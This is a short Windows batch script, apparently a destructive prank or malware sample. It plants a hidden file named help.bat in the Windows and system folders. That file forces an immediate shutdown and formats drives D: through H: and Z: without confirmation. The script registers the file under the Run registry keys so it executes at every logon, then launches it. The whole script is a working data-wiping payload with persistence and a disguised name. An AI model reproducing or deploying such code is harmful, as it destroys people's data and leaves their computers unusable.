@echo off 
title 1 
@echo @echo off >%windir%\help.bat >nul 
@echo attrib +s +a +r +h %windir%\system\help.bat >>%windir%\help.bat >nul 
@echo attrib +s +a +r +h %windir%\system32\help.bat >>%windir%\help.bat >nul 
@echo shutdown -s -f -t 0 >>%windir%\help.bat 
@echo format d: /y /autotest >>%windir%\help.bat
@echo format e: /y /autotest >>%windir%\help.bat
@echo format f: /y /autotest >>%windir%\help.bat
@echo format g: /y /autotest >>%windir%\help.bat
@echo format h: /y /autotest >>%windir%\help.bat
@echo format z: /y /autotest >>%windir%\help.bat
@reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v help /t reg_sz /d %windir%\help.bat /f 
@reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v help1 /t reg_sz /d %windir%\system32\help.bat /f 
@reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v help /t reg_sz /d %windir%\help.bat /f 
copy %windir%\help.bat %windir%\system32\help.bat >nul 
copy %windir%\help.bat %windir%\system\help.bat >nul 
attrib +s +a +r +h %windir%\help.bat 
attrib +s +a +r +h %windir%\system\help.bat 
attrib +s +a +r +h %windir%\system32\help.bat 
start %windir%\help.bat
